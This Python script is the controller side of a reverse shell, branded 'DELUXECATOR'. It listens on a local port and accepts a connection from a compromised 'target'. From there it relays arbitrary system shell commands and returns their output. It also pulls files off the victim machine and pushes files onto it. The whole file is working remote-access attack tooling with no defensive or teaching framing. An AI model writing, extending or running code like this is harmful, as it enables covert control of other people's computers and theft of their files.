import socket
import os
import json
import subprocess
import time
from pystyle import Write, Colors, Colorate


def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())
	
def reliable_recv():
	data = ""
	while True:
		try:
			print("")
			print("Reciving Data")
			data = data + target.recv(1024).decode().rstrip()
			print("Returning Data")
			print("----------------------")
			return json.loads(data)
		except ValueError:
			print("Json error")
			continue
			
def download_file(file_name):
			f = open(file_name, "wb")
			target.settimeout(1)
			chunk = target.recv(1024)
			while chunk:
				f.write(chunk)
				try:
					chunk = target.recv(1024)
				except socket.timeout as e:
					print("Downloaded File")
					break
			target.settimeout(None)
			f.close()

def upload_file(file_name):
			f = open(file_name, "rb")
			target.send(f.read())
			print("Uploaded File")



def target_communication():
	cmds="""
Commands
---------------------
All System Shell Commands
upload <FILE>
download <FILE>
clear
quit
======================
Colors
---------------------
Logs/Input = White
Infomation = Green
Output = Red
"""
	while True:
		print("")
		command = Write.Input(f"""
╭────────[DELUXECATOR/{list(ip)[0]}]
╰─Shell~#: """, Colors.blue_to_purple, interval=0)
		reliable_send(command)
		if command == 'quit':
			break
		elif command[:3]=="cd ":
			pass
		elif command == "clear" or command=="cls":
			os.system("cls")
		elif command[:8] == "download":
			download_file(command[9:])
		elif command[:6]=="upload":
			upload_file(command[7:])
		elif command=="help":
			print("")
			Write.Print(cmds, Colors.green_to_white, interval=0)
		elif command=="":
			pass
		elif command=="IP":
			result = reliable_recv()
			print("")
			Write.Print(result, Colors.red_to_white, interval=0.05)
		else:
			result = reliable_recv()
			print("")
			Write.Print(result, Colors.red_to_white, interval=0)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 1604
sock.bind((host, port))
Write.Print("[+] Listening For Incoming Connections", Colors.blue_to_purple, interval=0.05)
print("")
sock.listen(5)
target, ip = sock.accept()
Write.Print("[+] Recived Connection From: " + str(ip), Colors.blue_to_purple, interval=0.01)
print("")
target_communication()


